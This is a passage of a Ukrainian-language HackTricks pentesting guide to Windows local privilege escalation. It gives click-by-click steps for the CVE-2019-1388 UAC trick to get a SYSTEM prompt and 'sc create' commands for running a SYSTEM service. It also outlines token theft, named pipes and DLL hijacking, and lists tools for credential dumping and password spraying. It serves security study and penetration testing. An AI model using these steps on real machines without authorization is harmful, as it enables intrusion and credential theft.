Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Для використання цієї вразливості необхідно виконати наступні кроки:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
У вас є всі необхідні файли та інформація у наступному репозиторії GitHub:

https://github.com/jas502n/CVE-2019-1388

## Від середнього до високого рівня цілісності адміністратора / Ухилення UAC

Прочитайте це, щоб **дізнатися про рівні цілісності**:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

Потім **прочитайте це, щоб дізнатися про UAC та ухилення UAC:**

{% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

## **Від високого рівня до системи**

### **Новий сервіс**

Якщо ви вже працюєте у процесі високого рівня цілісності, **перехід до SYSTEM** може бути легким, просто **створивши та виконавши новий сервіс**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

З високопріоритетного процесу ви можете спробувати **увімкнути записи реєстру AlwaysInstallElevated** та **встановити** зворотний шел, використовуючи обгортку _**.msi**_.\
[Додаткова інформація про відповідні ключі реєстру та як встановити пакет _.msi_ тут.](./#alwaysinstallelevated)

### High + привілей SeImpersonate до System

**Ви можете** [**знайти код тут**](seimpersonate-from-high-to-system.md)**.**

### Від SeDebug + SeImpersonate до повних привілеїв токена

Якщо у вас є ці привілеї токена (імовірно, ви знайдете це вже в процесі високого пріоритету), ви зможете **відкрити майже будь-який процес** (не захищені процеси) з привілеєм SeDebug, **скопіювати токен** процесу та створити **довільний процес з цим токеном**.\
Використовуючи цю техніку, зазвичай **вибирається будь-який процес, що працює як SYSTEM з усіма привілеями токена** (_так, ви можете знайти процеси SYSTEM без усіх привілеїв токена_).\
**Ви можете знайти** [**приклад коду, що виконує запропоновану техніку тут**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Іменовані канали**

Ця техніка використовується meterpreter для ескалації в `getsystem`. Техніка полягає в **створенні каналу, а потім створенні/зловживанні сервісу для запису в цей канал**. Потім **сервер**, який створив канал, використовуючи привілей **`SeImpersonate`**, зможе **імітувати токен** клієнта каналу (сервісу), отримуючи привілеї SYSTEM.\
Якщо ви хочете [**дізнатися більше про іменовані канали, вам слід прочитати це**](./#named-pipe-client-impersonation).\
Якщо ви хочете прочитати приклад [**як перейти від високого пріоритету до System, використовуючи іменовані канали, вам слід прочитати це**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Якщо ви зможете **підманіти dll**, яку **завантажує** процес, що працює як **SYSTEM**, ви зможете виконати довільний код з цими дозволами. Тому Dll Hijacking також корисний для цього виду підвищення привілеїв, і, більше того, якщо це **набагато простіше досягти з високопріоритетного процесу**, оскільки він матиме **права на запис** у папках, які використовуються для завантаження dlls.\
**Ви можете** [**дізнатися більше про Dll hijacking тут**](dll-hijacking.md)**.**

### **Від адміністратора або служби мережі до System**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### Від LOCAL SERVICE або NETWORK SERVICE до повних привілеїв

**Читайте:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Додаткова допомога

[Статичні бінарні файли impacket](https://github.com/ropnop/impacket_static_binaries)

## Корисні інструменти

**Найкращий інструмент для пошуку векторів підвищення привілеїв на локальному комп'ютері з Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Перевірка на помилки конфігурації та чутливі файли (**[**перевірте тут**](../../windows/windows-local-privilege-escalation/broken-reference/)**). Виявлено.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Перевірка можливих помилок конфігурації та збір інформації (**[**перевірте тут**](../../windows/windows-local-privilege-escalation/broken-reference/)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Перевірка на помилки конфігурації**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Витягує інформацію про збережені сесії PuTTY, WinSCP, SuperPuTTY, FileZilla та RDP. Використовуйте -Thorough локально.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Витягує облікові дані з диспетчера облікових записів. Виявлено.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Розпилює зібрані паролі по домену**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh - це інструмент для підманування ADIDNS/LLMNR/mDNS/NBNS та man-in-the-middle на PowerShell.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Основна перевірка привілеїв Windows**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Пошук відомих уразливостей привілеїв (ЗАСТАРІЛО для Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Локальні перевірки **(Потрібні права адміністратора)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Пошук відомих уразливостей привілеїв (потрібно скомпілювати за допомогою VisualStudio) ([**перекомпільовано**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Перелічує хост, шукаючи помилки конфігурації (більше інструмент для збору інформації, ніж підвищення привілеїв) (потрібно скомпілювати) **(**[**перекомпільовано**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Витягує облікові дані з багатьох програм (перекомпільований exe на github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Порт PowerUp на C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Перевірка на помилки конфігурації (виконуваний файл перекомпільований на github). Не рекомендовано. Не працює добре в Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Перевірка можливих помилок конфігурації (exe з python). Не рекомендовано. Не працює добре в Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Інструмент, створений на основі цього посту (для правильної роботи не потрібно accesschk, але він може використовуватися).

**Локально**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Читає вивід **systeminfo** та рекомендує робочі експлойти (локальний python)\
[**Windows Exploit Suggester наступного покоління**](https://github.com/bitsadmin/wesng) -- Читає вивід **systeminfo** та рекомендує робочі експлойти (локальний python)

**Meterpreter**

_multi/recon/local\_exploit\_suggestor_

Вам потрібно скомпілювати проект, використовуючи правильну версію .NET ([див. це](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Щоб побачити встановлену версію .NET на хості жертви, ви можете зробити:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Бібліографія

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\\
* [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)\\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Працюєте в **кібербезпеці?** Хочете побачити **вашу компанію в рекламі HackTricks**? або хочете мати доступ до **останньої версії PEASS або завантажити HackTricks у PDF**? Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Дізнайтеся про [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* Отримайте [**офіційний PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Приєднуйтесь до** [**💬**](https://emojipedia.org/speech-balloon/) [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за мною на **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**репозиторію hacktricks**](https://github.com/carlospolop/hacktricks) **та** [**репозиторію hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
